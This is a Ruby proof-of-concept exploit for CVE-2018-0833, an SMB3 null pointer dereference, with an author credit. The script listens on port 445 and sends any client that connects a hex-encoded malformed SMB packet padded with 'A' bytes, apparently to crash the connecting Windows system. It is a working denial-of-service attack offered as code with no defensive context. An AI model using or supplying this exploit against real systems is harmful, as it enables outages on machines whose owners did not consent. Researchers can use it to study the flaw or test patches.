#!/usr/bin/env ruby
#
# CVE-2018-0833 | SMB3 Null Pointer Dereference
# KING SABRI | @KINGSABRI
# 
require 'socket'

payload = '000000ecfd534d4241414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141'

begin 
  server = TCPServer.new('0.0.0.0', 445) 
  client = server.accept
  puts "[+] From: #{client.peeraddr.last}"
  puts "[*] Sending Payload..."
  client.puts [payload].pack('H*')
  client.close
rescue Errno::EACCES
  puts "[!] Permission denied!"
end
